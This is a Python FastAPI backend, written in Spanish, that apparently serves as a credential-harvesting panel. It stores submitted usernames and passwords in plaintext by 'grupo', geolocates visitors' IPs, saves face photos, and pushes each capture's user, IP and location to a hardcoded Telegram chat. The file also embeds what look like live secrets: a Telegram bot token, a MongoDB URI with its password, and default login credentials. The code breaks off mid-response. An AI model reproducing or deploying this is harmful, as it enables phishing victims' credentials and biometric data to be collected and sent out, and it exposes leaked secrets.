import base64
import binascii
import json
import logging
import os
import time
import asyncio
import ipaddress
import hashlib
import hmac
from contextlib import asynccontextmanager
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Optional, Dict, Set, Any
from asyncio import Semaphore, Queue

import httpx
import dns.resolver
from bson import ObjectId
from motor.motor_asyncio import AsyncIOMotorClient, AsyncIOMotorGridFSBucket

from fastapi import FastAPI, Request, Form, HTTPException, Response as FastAPIResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from starlette.concurrency import run_in_threadpool
from starlette.datastructures import UploadFile
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.requests import ClientDisconnect
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response

from core import BASE, Models, InputError, MAX_FILE_BYTES, evaluar, reply
from fastapi import UploadFile, File

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(name)s | %(message)s'
)
log = logging.getLogger(__name__)

# ============================================================
# PILLOW — opcional
# ============================================================
try:
    from PIL import Image
    import io as _io
    PIL_DISPONIBLE = True
except ImportError:
    PIL_DISPONIBLE = False
    log.warning("Pillow no instalado: las fotos se guardarán sin comprimir.")

# ============================================================
# GRIDFS — opcional
# ============================================================
try:
    GRIDFS_DISPONIBLE = True
except ImportError:
    GRIDFS_DISPONIBLE = False
    log.warning("gridfs no disponible.")

# ============================================================
# DNS RESOLVER
# ============================================================
try:
    import dns.rdtypes.ANY.SRV  # noqa
except ImportError:
    try:
        import dns.rdtypes.inet.SRV  # noqa
    except ImportError:
        pass

_custom_resolver = dns.resolver.Resolver(configure=False)
_custom_resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
_custom_resolver.timeout = 5.0
_custom_resolver.lifetime = 5.0

dns.resolver.default_resolver = _custom_resolver
_original_resolve = dns.resolver.resolve


def _patched_resolve(qname, rdtype='A', *args, **kwargs):
    return _custom_resolver.resolve(qname, rdtype, *args, **kwargs)


dns.resolver.resolve = _patched_resolve
try:
    dns.resolver.query = _patched_resolve
except Exception:
    pass

try:
    import pymongo.srv_resolver as _srv_resolver
    import pymongo.uri_parser as _uri_parser

    _patched_dns_module = type('dns_patched', (), {
        'resolver': type('resolver_patched', (), {
            'default_resolver': _custom_resolver,
            'resolve': _patched_resolve,
            'query': _patched_resolve,
        })
    })()

    _srv_resolver.dns = _patched_dns_module
    _uri_parser.dns = _patched_dns_module
except Exception:
    pass

# ============================================================
# CONFIG
# ============================================================
TOKEN = os.getenv("TELEGRAM_TOKEN", "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g")
AUTH_USERNAME = os.getenv("AUTH_USERNAME", "gato")
AUTH_PASSWORD = os.getenv("AUTH_PASSWORD", "Gato1234@")

MONGO_URI_SRV = os.getenv(
    "MONGO_URI_SRV",
    "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
)
MONGO_URI_DIRECT = os.getenv("MONGO_URI_DIRECT", "")

MAX_BODY = 12 * 1024 * 1024
MAX_VIDEO_BYTES = 50 * 1024 * 1024

# Anti-flood
ATTACK_THRESHOLD_COUNT = 10
ATTACK_TIME_WINDOW = 2.0
TEMP_BAN_DURATION = 900

ip_request_history = defaultdict(list)
temp_banned_ips: Dict[str, float] = {}
blocked_ips_cache: Set[str] = set()

# ============================================================
# GEO CACHE
# ============================================================
GEO_CACHE_TTL = 3600
GEO_CACHE_MAX = 20000
geo_cache: Dict[str, tuple] = {}

MAX_CONCURRENT_REQUESTS = 100
MAX_DB_CONNECTIONS = 20
MAX_HTTP_CONNECTIONS = 50
REQUEST_TIMEOUT = 30

request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(20)

background_queue: Queue = Queue(maxsize=1000)

PAISES_LATINOAMERICA = frozenset({
    'AR', 'BO', 'BR', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV',
    'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'UY', 'VE', 'PR',
    'GF', 'GY', 'SR', 'BZ', 'JM', 'HT', 'TT', 'BB', 'GD', 'LC',
    'VC', 'DM', 'AG', 'KN', 'BS',
})

# ============================================================
# EXCEPCIÓN
# ============================================================
class TooLarge(Exception):
    pass

# ============================================================
# HASHING
# ============================================================
def hash_password(password: str, salt: Optional[str] = None):
    if salt is None:
        salt = os.urandom(16).hex()
    hashed = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        100000
    ).hex()
    return hashed, salt


def verify_password(password: str, stored_hash: str, salt: str) -> bool:
    hashed_attempt, _ = hash_password(password, salt)
    return hmac.compare_digest(hashed_attempt, stored_hash)


def verify_password_safe(password: str, doc: dict) -> bool:
    if "hash" in doc and "salt" in doc:
        return verify_password(password, doc["hash"], doc["salt"])
    if "password" in doc:
        return hmac.compare_digest(str(doc["password"]), password)
    return False

# ============================================================
# MONGO
# ============================================================
class MongoState:
    def __init__(self):
        self.client: Optional[AsyncIOMotorClient] = None
        self.db = None
        self.logs_usuarios = None
        self.ip_bloqueadas = None
        self.credenciales_usuario = None
        self.auditoria_maestro = None
        self.caras_usuarios = None
        self.videos_usuarios = None
        self.fs_bucket: Optional[AsyncIOMotorGridFSBucket] = None

    def init(self):
        self.client = _crear_cliente_mongo()
        self.db = self.client["api_db2"]
        self.logs_usuarios = self.db["logs_usuarios"]
        self.ip_bloqueadas = self.db["ip_bloqueadas"]
        self.credenciales_usuario = self.db["credenciales_usuario"]
        self.auditoria_maestro = self.db["auditoria_maestro"]
        self.caras_usuarios = self.db["caras_usuarios"]
        self.videos_usuarios = self.db["videos_usuarios"]
        self.fs_bucket = (
            AsyncIOMotorGridFSBucket(self.db, bucket_name="videos_fs")
            if GRIDFS_DISPONIBLE else None
        )
        log.info("MongoState inicializado")

    def close(self):
        if self.client is not None:
            try:
                self.client.close()
            except Exception as e:
                log.warning(f"Error cerrando cliente Mongo: {e}")
            self.client = None
            log.info("MongoState cerrado")


mongo = MongoState()


def _crear_cliente_mongo():
    opciones = dict(
        maxPoolSize=MAX_DB_CONNECTIONS,
        minPoolSize=2,
        maxIdleTimeMS=60000,
        serverSelectionTimeoutMS=15000,
        socketTimeoutMS=15000,
        connectTimeoutMS=15000,
        waitQueueTimeoutMS=10000,
        maxConnecting=5,
        retryWrites=True
    )
    if MONGO_URI_DIRECT:
        return AsyncIOMotorClient(MONGO_URI_DIRECT, **opciones)
    return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)

# ============================================================
# IMAGEN HELPERS
# ============================================================
def _detectar_mime(raw: bytes) -> str:
    if not raw or len(raw) < 4:
        return "application/octet-stream"
    if raw[:3] == b"\xff\xd8\xff":
        return "image/jpeg"
    if raw[:8] == b"\x89PNG\r\n\x1a\n":
        return "image/png"
    if raw[:6] in (b"GIF87a", b"GIF89a"):
        return "image/gif"
    if raw[:4] == b"RIFF" and raw[8:12] == b"WEBP":
        return "image/webp"
    if raw[:2] == b"BM":
        return "image/bmp"
    return "application/octet-stream"


def _comprimir_foto(raw: bytes, max_ancho: int = 1024, calidad: int = 78):
    mime_original = _detectar_mime(raw)
    if not PIL_DISPONIBLE:
        return raw, mime_original
    try:
        img = Image.open(_io.BytesIO(raw))
        try:
            from PIL import ImageOps
            img = ImageOps.exif_transpose(img)
        except Exception:
            pass
        if img.mode in ("RGBA", "LA", "P"):
            img = img.convert("RGBA")
            fondo = Image.new("RGB", img.size, (255, 255, 255))
            fondo.paste(img, mask=img.split()[-1])
            img = fondo
        elif img.mode != "RGB":
            img = img.convert("RGB")
        if img.width > max_ancho:
            ratio = max_ancho / float(img.width)
            nuevo_alto = max(1, int(img.height * ratio))
            img = img.resize((max_ancho, nuevo_alto), Image.LANCZOS)
        out = _io.BytesIO()
        img.save(out, format="JPEG", quality=calidad, optimize=True, progressive=True)
        resultado = out.getvalue()
        if len(resultado) >= len(raw) and mime_original == "image/jpeg":
            return raw, "image/jpeg"
        return resultado, "image/jpeg"
    except Exception as e:
        log.warning(f"No se pudo comprimir la foto: {e}")
        return raw, mime_original

# ============================================================
# LECTURA DE CUERPO
# ============================================================
async def _leer_cuerpo_limitado(request: Request, max_bytes: int) -> bytes:
    declared = request.headers.get('content-length')
    if declared is not None:
        try:
            length = int(declared)
        except ValueError:
            raise InputError('Content-Length inválido.') from None
        if length < 0 or length > max_bytes:
            raise TooLarge()
    body = bytearray()
    async for chunk in request.stream():
        if len(body) + len(chunk) > max_bytes:
            raise TooLarge()
        body.extend(chunk)
    if not body:
        raise InputError('El cuerpo está vacío.')
    return bytes(body)


async def leer_imagen(request: Request):
    declared = request.headers.get('content-length')
    if declared is not None:
        try:
            length = int(declared)
        except ValueError:
            raise InputError('Content-Length inválido.') from None
        if length < 0 or length > MAX_BODY:
            raise TooLarge()
    body = bytearray()
    async for chunk in request.stream():
        if len(body) + len(chunk) > MAX_BODY:
            raise TooLarge()
        body.extend(chunk)

    content_type = request.headers.get('content-type', '').split(';', 1)[0].strip().lower()
    if content_type == 'application/json':
        try:
            data = json.loads(body)
        except (ValueError, UnicodeError, RecursionError):
            raise InputError('El JSON no es válido.') from None
        if not isinstance(data, dict):
            raise InputError('El JSON debe ser un objeto.')
        encoded = data.get('image_base64')
        if not isinstance(encoded, str) or not encoded.strip():
            raise InputError('image_base64 debe ser una cadena no vacía.')
        encoded = encoded.strip()
        if encoded.startswith('data:'):
            header, sep, encoded = encoded.partition(',')
            if not sep or not header.lower().startswith('data:image/'):
                raise InputError('El prefijo base64 no es válido.')
        if len(encoded) > 4 * ((MAX_FILE_BYTES + 2) // 3):
            raise TooLarge()
        try:
            raw = base64.b64decode(encoded, validate=True)
        except (ValueError, binascii.Error):
            raise InputError('El contenido base64 no es válido.') from None
    elif content_type == 'multipart/form-data':
        async def receive():
            return {'type': 'http.request', 'body': bytes(body), 'more_body': False}
        bounded_request = Request(request.scope, receive)
        async with bounded_request.form(max_files=5, max_fields=10, max_part_size=MAX_FILE_BYTES) as form:
            items = form.getlist('image')
            if len(items) != 1 or not isinstance(items[0], UploadFile):
                raise InputError(f'Envía exactamente un archivo en image.')
            raw = await items[0].read(MAX_FILE_BYTES + 1)
    else:
        raise HTTPException(415, 'Usa multipart/form-data o application/json.')

    if len(raw) > MAX_FILE_BYTES:
        raise TooLarge()
    if not raw:
        raise InputError('La imagen está vacía.')
    return raw


REQUEST_SCHEMA = {'requestBody': {'required': True, 'content': {
    'multipart/form-data': {'schema': {'type': 'object', 'required': ['image'],
                                       'properties': {'image': {'type': 'string', 'format': 'binary'}}}},
    'application/json': {'schema': {'type': 'object', 'required': ['image_base64'],
                                       'properties': {'image_base64': {'type': 'string'}}}}
}}}

# ============================================================
# GEOLOCALIZACIÓN MULTI-PROVEEDOR
# ============================================================
def _geo_vacio(motivo: str = "unknown") -> dict:
    return {
        "pais": "Unknown",
        "pais_code": "XX",
        "ciudad": "",
        "region": "",
        "isp": "",
        "lat": None,
        "lon": None,
        "geo_fuente": motivo,
    }


def _geo_local() -> dict:
    return {
        "pais": "Local",
        "pais_code": "LO",
        "ciudad": "Local",
        "region": "",
        "isp": "",
        "lat": None,
        "lon": None,
        "geo_fuente": "local",
    }


async def _http_get_json(url: str, timeout: float = 4.0):
    async with http_semaphore:
        try:
            r = await asyncio.wait_for(
                app.state.http_client.get(url, timeout=timeout),
                timeout=timeout + 1.0,
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            return None
    return None


async def _geo_ipwhois_app(ip: str):
    d = await _http_get_json(f"http://ipwhois.app/json/{ip}")
    if not isinstance(d, dict):
        return None
    cc = (d.get("country_code") or "").upper()
    if not cc:
        return None
    return {
        "pais": d.get("country") or "Unknown",
        "pais_code": cc,
        "ciudad": d.get("city") or "",
        "region": d.get("region") or "",
        "isp": d.get("isp") or "",
        "lat": d.get("latitude"),
        "lon": d.get("longitude"),
    }


async def _geo_ipapi_co(ip: str):
    d = await _http_get_json(f"https://ipapi.co/{ip}/json/")
    if not isinstance(d, dict) or d.get("error"):
        return None
    cc = (d.get("country_code") or "").upper()
    if not cc:
        return None
    return {
        "pais": d.get("country_name") or "Unknown",
        "pais_code": cc,
        "ciudad": d.get("city") or "",
        "region": d.get("region") or "",
        "isp": d.get("org") or "",
        "lat": d.get("latitude"),
        "lon": d.get("longitude"),
    }


async def _geo_ip_api_com(ip: str):
    d = await _http_get_json(
        f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,regionName,isp,lat,lon"
    )
    if not isinstance(d, dict) or d.get("status") != "success":
        return None
    cc = (d.get("countryCode") or "").upper()
    if not cc:
        return None
    return {
        "pais": d.get("country") or "Unknown",
        "pais_code": cc,
        "ciudad": d.get("city") or "",
        "region": d.get("regionName") or "",
        "isp": d.get("isp") or "",
        "lat": d.get("lat"),
        "lon": d.get("lon"),
    }


async def _geo_freeipapi(ip: str):
    d = await _http_get_json(f"https://freeipapi.com/api/json/{ip}")
    if not isinstance(d, dict):
        return None
    cc = (d.get("countryCode") or "").upper()
    if not cc:
        return None
    return {
        "pais": d.get("countryName") or "Unknown",
        "pais_code": cc,
        "ciudad": d.get("cityName") or "",
        "region": d.get("regionName") or "",
        "isp": "",
        "lat": d.get("latitude"),
        "lon": d.get("longitude"),
    }


async def _geo_ipinfo_io(ip: str):
    d = await _http_get_json(f"https://ipinfo.io/{ip}/json")
    if not isinstance(d, dict):
        return None
    cc = (d.get("country") or "").upper()
    if not cc:
        return None
    loc_raw = d.get("loc") or ""
    lat = lon = None
    if "," in loc_raw:
        try:
            a, b = loc_raw.split(",", 1)
            lat = float(a)
            lon = float(b)
        except (ValueError, TypeError):
            pass
    return {
        "pais": cc,
        "pais_code": cc,
        "ciudad": d.get("city") or "",
        "region": d.get("region") or "",
        "isp": d.get("org") or "",
        "lat": lat,
        "lon": lon,
    }


async def _geo_ip_geolocation(ip: str):
    d = await _http_get_json(f"https://ipgeolocation.abstractapi.com/v1/?ip_address={ip}")
    return None


GEO_PROVEEDORES = [
    ("ipwhois.app", _geo_ipwhois_app),
    ("ipapi.co", _geo_ipapi_co),
    ("ip-api.com", _geo_ip_api_com),
    ("freeipapi.com", _geo_freeipapi),
    ("ipinfo.io", _geo_ipinfo_io),
]


def _prune_geo_cache():
    if len(geo_cache) <= GEO_CACHE_MAX:
        return
    ahora = time.time()
    expirados = [k for k, v in geo_cache.items() if (ahora - v[0]) > GEO_CACHE_TTL]
    for k in expirados:
        geo_cache.pop(k, None)
    if len(geo_cache) > GEO_CACHE_MAX:
        ordenados = sorted(geo_cache.items(), key=lambda kv: kv[1][0])
        for k, _ in ordenados[: len(geo_cache) - GEO_CACHE_MAX]:
            geo_cache.pop(k, None)


async def geolocalizar_ip(ip: str) -> dict:
    try:
        obj = ipaddress.ip_address(ip)
        if obj.is_private or obj.is_loopback or obj.is_reserved or obj.is_multicast:
            return _geo_local()
    except ValueError:
        return _geo_vacio("ip_invalida")

    ahora = time.time()
    cached = geo_cache.get(ip)
    if cached and (ahora - cached[0]) < GEO_CACHE_TTL:
        return cached[1]

    for nombre, fn in GEO_PROVEEDORES:
        try:
            res = await fn(ip)
            if res and res.get("pais_code") and res["pais_code"] != "XX":
                res["geo_fuente"] = nombre
                geo_cache[ip] = (ahora, res)
                _prune_geo_cache()
                log.info(f"Geo {ip} → {res['pais_code']}/{res.get('ciudad')} via {nombre}")
                return res
        except Exception as e:
            log.debug(f"Proveedor geo {nombre} falló para {ip}: {e}")
            continue

    resultado = _geo_vacio("sin_proveedor")
    geo_cache[ip] = (ahora, resultado)
    _prune_geo_cache()
    return resultado

# ============================================================
# HELPERS GENERALES
# ============================================================
async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        log.warning("Background queue llena")


async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            if asyncio.iscoroutinefunction(func):
                await func(*args, **kwargs)
            else:
                func(*args, **kwargs)
            background_queue.task_done()
        except Exception as e:
            log.error(f"Worker error: {e}")
            await asyncio.sleep(1)


async def init_db_async():
    async with db_semaphore:
        try:
            tareas = [
                mongo.ip_bloqueadas.create_index("ip", unique=True, background=True),
                mongo.logs_usuarios.create_index("grupo", background=True),
                mongo.logs_usuarios.create_index("fecha", background=True),
                mongo.logs_usuarios.create_index("pais_code", background=True),
                mongo.logs_usuarios.create_index("ciudad", background=True),
                # ← CAMBIO: clave compuesta (usuario, grupo) en vez de session_id
                mongo.logs_usuarios.create_index(
                    [("usuario", 1), ("grupo", 1)],
                    unique=True,
                    background=True,
                    name="usuario_grupo_unique",
                ),
                mongo.credenciales_usuario.create_index("usuario", unique=True, background=True),
                mongo.auditoria_maestro.create_index("tipo_accion", background=True),
                mongo.auditoria_maestro.create_index("grupo_origen", background=True),
                mongo.caras_usuarios.create_index("usuario", background=True),
                mongo.caras_usuarios.create_index("grupo", background=True),
                mongo.caras_usuarios.create_index("fecha", background=True),
                mongo.caras_usuarios.create_index("pais_code", background=True),
                mongo.caras_usuarios.create_index("ciudad", background=True),
                mongo.videos_usuarios.create_index("usuario", background=True),
                mongo.videos_usuarios.create_index("grupo", background=True),
                mongo.videos_usuarios.create_index("fecha", background=True),
                mongo.videos_usuarios.create_index("pais_code", background=True),
                mongo.videos_usuarios.create_index("ciudad", background=True),
            ]
            await asyncio.gather(*tareas, return_exceptions=True)
            log.info("Índices creados")
        except Exception as e:
            log.error(f"DB error: {e}")


async def load_caches():
    global blocked_ips_cache
    async with db_semaphore:
        try:
            blocked_docs = mongo.ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
        except Exception as e:
            log.error(f"Error cargando caches: {e}")


def obtener_ip_real(request: Request) -> str:
    for header in ["cf-connecting-ip", "x-real-ip", "x-forwarded-for", "x-client-ip", "forwarded"]:
        value = request.headers.get(header)
        if value:
            if "for=" in value.lower():
                value = value.split("for=")[-1].split(";")[0].strip().strip('"')
            ip = value.split(",")[0].strip()
            try:
                ipaddress.ip_address(ip)
                return ip
            except ValueError:
                continue
    return request.client.host if request.client else "127.0.0.1"


async def _enviar_telegram(mensaje: str):
    async with telegram_semaphore:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {"chat_id": "-4826186479", "text": mensaje[:4000]}
            await asyncio.wait_for(
                app.state.http_client.post(url, json=payload), timeout=5.0
            )
        except Exception as e:
            log.error(f"Error Telegram: {e}")


async def registrar_auditoria(tipo_accion, autor, grupo_origen, datos_previos, datos_nuevos=None):
    async with db_semaphore:
        try:
            await mongo.auditoria_maestro.insert_one({
                "tipo_accion": tipo_accion,
                "autor": autor,
                "grupo_origen": grupo_origen,
                "datos_previos": datos_previos,
                "datos_nuevos": datos_nuevos,
                "fecha_auditoria": datetime.utcnow()
            })
        except Exception as e:
            log.error(f"Error guardando auditoria: {e}")

# ============================================================
# HELPERS DINÁMICOS (LOGS CON CAMPOS VARIABLES)
# ============================================================
CAMPOS_RESERVADOS_LOG = {
    "usuario", "grupo",
    "tipo",
    "ip", "pais", "pais_code", "ciudad", "region", "isp",
    "lat", "lon", "geo_fuente",
    "fecha", "fecha_actualizado",
}


def _sanitizar_nombre_campo(nombre: str) -> str:
    """MongoDB no permite '.' ni '$' al inicio del nombre de un campo."""
    n = str(nombre).strip()[:100]
    n = n.replace("$", "_").replace(".", "_")
    return n or "campo"


def _sanitizar_valor(valor) -> str:
    if isinstance(valor, str):
        return valor[:500]
    return f"[{type(valor).__name__}]"[:500]


# ← CAMBIO: upsert por (usuario, grupo) en lugar de session_id
async def _upsert_log_usuario(usuario: str, campos: dict,
                              geo: dict, ip: str, grupo: str, tipo: str):
    """
    Upsert por (usuario, grupo):
      - Un usuario puede tener un documento por cada grupo.
      - Editar un grupo NO afecta a los otros.
      - 'campos' se FUSIONA (clave existente se actualiza, nueva se agrega).
      - IP/geo/fecha_actualizado se refrescan siempre.
    Devuelve (documento, es_nuevo).
    """
    async with db_semaphore:
        try:
            ahora = datetime.utcnow()
            usuario_norm = (usuario or "").strip()[:200]
            grupo_norm = (grupo.strip().lower()[:50] if grupo else "general")

            if not usuario_norm:
                return None, False

            filtro = {"usuario": usuario_norm, "grupo": grupo_norm}

            set_doc = {
                "ip": ip,
                "pais": geo.get("pais", "Unknown"),
                "pais_code": geo.get("pais_code", "XX"),
                "ciudad": geo.get("ciudad", ""),
                "region": geo.get("region", ""),
                "isp": geo.get("isp", ""),
                "lat": geo.get("lat"),
                "lon": geo.get("lon"),
                "geo_fuente": geo.get("geo_fuente", ""),
                "fecha_actualizado": ahora,
            }
            if tipo:
                set_doc["tipo"] = tipo.strip().lower()[:50]

            for k, v in campos.items():
                if k in CAMPOS_RESERVADOS_LOG:
                    continue
                set_doc[f"campos.{k}"] = v
                if k in ("contra", "contrasena"):
                    set_doc["contrasena"] = v

            update_doc = {
                "$set": set_doc,
                "$setOnInsert": {
                    "usuario": usuario_norm,
                    "grupo": grupo_norm,
                    "fecha": ahora,
                    "tipo": (tipo.strip().lower()[:50] if tipo else "login"),
                },
            }

            result = await mongo.logs_usuarios.update_one(
                filtro, update_doc, upsert=True
            )
            doc = await mongo.logs_usuarios.find_one(filtro)
            es_nuevo = result.upserted_id is not None
            return doc, es_nuevo
        except Exception as e:
            log.error(f"Error guardando log: {e}")
            return None, False

# ============================================================
# MIDDLEWARE
# ============================================================
class AntiFloodDefenseMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        client_ip = obtener_ip_real(request)
        now = time.time()

        if client_ip in blocked_ips_cache:
            return JSONResponse(status_code=403, content={"detail": "Acceso bloqueado permanentemente"})

        if client_ip in temp_banned_ips:
            unlock_time = temp_banned_ips[client_ip]
            if now < unlock_time:
                remaining = int(unlock_time - now)
                return JSONResponse(
                    status_code=429,
                    content={"detail": f"IP bloqueada temporalmente. Intente en {remaining}s."}
                )
            else:
                del temp_banned_ips[client_ip]

        timestamps = ip_request_history[client_ip]
        ip_request_history[client_ip] = [t for t in timestamps if now - t < ATTACK_TIME_WINDOW]
        ip_request_history[client_ip].append(now)

        if len(ip_request_history[client_ip]) > ATTACK_THRESHOLD_COUNT:
            temp_banned_ips[client_ip] = now + TEMP_BAN_DURATION
            ip_request_history.pop(client_ip, None)
            log.warning(f"IP Bloqueada por rafaga: {client_ip}")
            return JSONResponse(
                status_code=429,
                content={"detail": f"Exceso de peticiones. Bloqueo {TEMP_BAN_DURATION // 60} min."}
            )

        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    response: Response = await call_next(request)
                    response.headers["X-Content-Type-Options"] = "nosniff"
                    response.headers["X-Frame-Options"] = "DENY"
                    response.headers["X-XSS-Protection"] = "1; mode=block"
                    return response
        except ClientDisconnect:
            raise
        except asyncio.TimeoutError:
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado"})
        except Exception:
            log.exception("Error en middleware")
            return JSONResponse(status_code=500, content={"detail": "Error interno"})

# ============================================================
# LIFESPAN
# ============================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    mongo.init()
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )
    await init_db_async()
    await load_caches()
    app.state.bg_worker = asyncio.create_task(background_worker())

    if getattr(app.state, '_engine_override', None) is not None:
        app.state.engine = app.state._engine_override
    else:
        try:
            app.state.engine = await run_in_threadpool(Models)
        except Exception as e:
            log.warning(f"Engine opcional no iniciado: {e}")
            app.state.engine = None

    try:
        yield
    finally:
        app.state.engine = None
        await background_queue.put(None)
        try:
            await app.state.bg_worker
        except Exception:
            pass
        await app.state.http_client.aclose()
        mongo.close()

# ============================================================
# CREATE APP
# ============================================================
def create_app(engine=None):
    app = FastAPI(
        title='API REST Desacoplada',
        version='6.4.0',  # ← CAMBIO: versión
        lifespan=lifespan
    )
    app.state._engine_override = engine
    app.state.engine = None

    origins_env = [s.strip() for s in os.getenv('CORS_ORIGINS', '').split(',') if s.strip()]
    if origins_env:
        app.add_middleware(
            CORSMiddleware,
            allow_origins=origins_env,
            allow_methods=['GET', 'POST', 'PUT', 'DELETE'],
            allow_headers=['*'],
            expose_headers=['Retry-After'],
        )
    else:
        app.add_middleware(
            CORSMiddleware,
            allow_origins=["*"],
            allow_methods=['GET', 'POST', 'PUT', 'DELETE'],
            allow_headers=['*'],
        )

    app.add_middleware(AntiFloodDefenseMiddleware)

    # ---------- Exception handlers ----------
    @app.exception_handler(InputError)
    async def input_error(request, error):
        return JSONResponse(
            reply(False, [str(error)]) if 'reply' in globals() else {"ok": False, "errors": [str(error)]},
            status_code=400
        )

    @app.exception_handler(TooLarge)
    async def too_large(request, error):
        return JSONResponse({"ok": False, "errors": ['Máximo permitido excedido.']}, status_code=413)

    @app.exception_handler(StarletteHTTPException)
    async def http_error(request, error):
        return JSONResponse({"ok": False, "detail": str(error.detail)}, status_code=error.status_code)

    @app.exception_handler(ClientDisconnect)
    async def disconnected(request, error):
        return JSONResponse({"ok": False, "detail": 'Se interrumpió la subida.'}, status_code=400)

    @app.exception_handler(Exception)
    async def internal_error(request, error):
        log.exception('Error interno no controlado')
        return JSONResponse({"ok": False, "detail": 'No se pudo completar la solicitud.'}, status_code=500)

    # ========================================================
    # HEALTH / ROOT
    # ========================================================
    @app.get('/health')
    async def health():
        ready = app.state.engine is not None
        db_ready = mongo.client is not None
        return JSONResponse(
            {
                'status': 'ok' if (ready and db_ready) else 'not_ready',
                'modelos_listos': ready,
                'db_lista': db_ready,
                'geo_cache_size': len(geo_cache),
            },
            status_code=200 if (ready and db_ready) else 503
        )

    @app.get('/', include_in_schema=False)
    async def root():
        if (BASE / 'index.html').exists():
            return FileResponse(BASE / 'index.html', media_type='text/html', headers={'Cache-Control': 'no-store'})
        return {"message": "API REST en funcionamiento."}

    @app.get('/status')
    async def read_status():
        return {"status": "online"}

    # ========================================================
    # VERIFICAR ROSTRO
    # ========================================================
    @app.post('/verificar-rostro', openapi_extra=REQUEST_SCHEMA)
    async def verificar_rostro(request: Request):
        model = app.state.engine
        if model is None:
            return JSONResponse({'ok': False, 'detail': ['Modelos no disponibles.']}, status_code=503)
        if not getattr(model, 'lock', None) or not model.lock.acquire(blocking=False):
            return JSONResponse(
                {'ok': False, 'detail': ['Servidor ocupado. Reintenta.']},
                status_code=503,
                headers={'Retry-After': '2'}
            )
        try:
            import anyio
            with anyio.fail_after(30):
                raw = await leer_imagen(request)
            return await run_in_threadpool(evaluar, model, raw)
        except TimeoutError:
            return JSONResponse({'ok': False, 'detail': ['Subida lenta.']}, status_code=408)
        finally:
            if getattr(model, 'lock', None):
                model.lock.release()

    # ========================================================
    # GUARDAR CARA
    # ========================================================
    async def _guardar_cara_db(usuario, grupo, foto_b64, mime, size_original, size_guardado, geo, ip, etiqueta):
        async with db_semaphore:
            try:
                doc = {
                    "usuario": usuario[:200],
                    "grupo": grupo.strip().lower()[:50],
                    "etiqueta": (etiqueta or '')[:100],
                    "foto_b64": foto_b64,
                    "foto_mime": mime,
                    "foto_bytes_original": size_original,
                    "foto_bytes": size_guardado,
                    "ip": ip,
                    "pais": geo.get("pais", "Unknown"),
                    "pais_code": geo.get("pais_code", "XX"),
                    "ciudad": geo.get("ciudad", ""),
                    "region": geo.get("region", ""),
                    "isp": geo.get("isp", ""),
                    "lat": geo.get("lat"),
                    "lon": geo.get("lon"),
                    "geo_fuente": geo.get("geo_fuente", ""),
                    "fecha": datetime.utcnow(),
                }
                result = await mongo.caras_usuarios.insert_one(doc)
                log.info(f"Cara {result.inserted_id} [{usuario}] {geo.get('pais_code')}/{geo.get('ciudad')}")
                return result.inserted_id
            except Exception as e:
                log.error(f"Error guardando cara: {e}")
                return None

    @app.post("/guardar_cara")
    async def guardar_cara(
        request: Request,
        image: UploadFile = File(...),
        usuario: str = Form(...),
        grupo: str = Form("general"),
        etiqueta: str = Form("")
    ):
        ip = obtener_ip_real(request)
        geo = await geolocalizar_ip(ip)
        grupo_limpio = grupo.strip().lower()[:50]
        etiqueta_limpia = (etiqueta or '').strip()[:100]

        raw = await image.read(MAX_FILE_BYTES + 1)
        if len(raw) > MAX_FILE_BYTES:
            raise TooLarge()
        if not raw:
            raise InputError('La imagen está vacía.')

        mime_original = _detectar_mime(raw)
        if not mime_original.startswith("image/"):
            raise InputError('El archivo no es una imagen válida.')

        comprimida, mime = _comprimir_foto(raw)
        b64 = base64.b64encode(comprimida).decode('ascii')

        await add_background_task(
            _guardar_cara_db,
            usuario, grupo_limpio, b64, mime,
            len(raw), len(comprimida),
            geo, ip, etiqueta_limpia
        )

        msg = (f"🖼️ *Nueva Cara [{grupo_limpio}]*\n"
               f"👤 Usuario: `{usuario}`\n"
               f"🏷️ Etiqueta: `{etiqueta_limpia}`\n"
               f"🌐 IP: `{ip}`\n"
               f"🌍 {geo.get('pais')} / {geo.get('ciudad')} ({geo.get('pais_code')})\n"
               f"📦 {len(raw)} → {len(comprimida)} bytes")
        await add_background_task(_enviar_telegram, msg)

        return {
            "message": "Cara guardada correctamente",
            "usuario": usuario,
            "grupo": grupo_limpio,
            "etiqueta": etiqueta_limpia,
            "ip": ip,
            "pais": geo.get("pais"),
            "pais_code": geo.get("pais_code"),
            "ciudad": geo.get("ciudad"),
